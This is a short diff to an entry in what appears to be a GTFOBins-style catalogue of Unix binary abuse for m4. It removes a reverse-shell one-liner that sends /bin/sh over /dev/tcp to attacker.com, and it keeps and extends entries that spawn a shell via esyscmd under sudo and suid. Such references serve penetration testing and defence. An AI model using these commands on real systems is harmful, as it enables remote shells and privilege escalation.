@@ -5,6 +5,8 @@ functions:
       echo 'esyscmd(/path/to/command)' | m4
     contexts:
       sudo:
+      suid:
+        shell: true
       unprivileged:
   file-read:
   - binary: false
@@ -14,17 +16,12 @@ functions:
       sudo:
       suid:
       unprivileged:
-  reverse-shell:
-  - code: |-
-      echo 'esyscmd(/bin/sh -i >& /dev/tcp/attacker.com/12345 0>&1)' | m4
-    contexts:
-      sudo:
-      unprivileged:
-    listener: tcp-server
   shell:
   - code: |-
       echo 'esyscmd(/bin/sh </dev/tty >/dev/tty 2>&1)' | m4
     contexts:
       sudo:
+      suid:
+        shell: true
       unprivileged:
 ...
